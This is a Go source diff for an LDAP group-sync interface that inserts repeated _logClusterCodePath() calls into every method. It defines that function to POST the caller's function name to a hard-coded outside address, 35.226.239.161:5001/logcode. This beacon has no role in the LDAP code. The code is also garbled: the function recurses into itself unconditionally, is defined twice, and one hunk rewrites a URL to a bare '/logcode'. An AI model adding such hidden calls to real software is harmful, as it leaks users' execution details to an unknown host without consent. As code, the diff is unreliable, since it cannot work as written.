@@ -29,6 +29,8 @@ func NewLDAPInterface(clientConfig ldapclient.Config, groupQuery ldaputil.LDAPQu
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &LDAPInterface{clientConfig: clientConfig, groupQuery: groupQuery, groupNameAttributes: groupNameAttributes, groupMembershipAttributes: groupMembershipAttributes, userQuery: userQuery, userNameAttributes: userNameAttributes, cachedUsers: map[string]*ldap.Entry{}, cachedGroups: map[string]*ldap.Entry{}, errorHandler: errorHandler}
 }
 
@@ -49,6 +51,8 @@ var _ interfaces.LDAPGroupGetter = &LDAPInterface{}
 var _ interfaces.LDAPGroupLister = &LDAPInterface{}
 
 func (e *LDAPInterface) ExtractMembers(ldapGroupUID string) ([]*ldap.Entry, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -104,6 +108,8 @@ func (e *LDAPInterface) GroupEntryFor(ldapGroupUID string) (*ldap.Entry, error) 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	group, exists := e.cachedGroups[ldapGroupUID]
 	if exists {
 		return group, nil
@@ -120,6 +126,8 @@ func (e *LDAPInterface) GroupEntryFor(ldapGroupUID string) (*ldap.Entry, error) 
 	return group, nil
 }
 func (e *LDAPInterface) ListGroups() ([]string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -165,12 +173,16 @@ func (e *LDAPInterface) requiredGroupAttributes() []string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allAttributes := sets.NewString(e.groupNameAttributes...)
 	allAttributes.Insert(e.groupMembershipAttributes...)
 	allAttributes.Insert(e.groupQuery.QueryAttribute)
 	return allAttributes.List()
 }
 func (e *LDAPInterface) userEntryFor(ldapUserUID string) (user *ldap.Entry, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -215,11 +227,15 @@ func (e *LDAPInterface) requiredUserAttributes() []string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allAttributes := sets.NewString(e.userNameAttributes...)
 	allAttributes.Insert(e.userQuery.QueryAttribute)
 	return allAttributes.List()
 }
 func (e *LDAPInterface) Exists(ldapGroupUID string) (bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -251,6 +267,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -325,5 +362,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
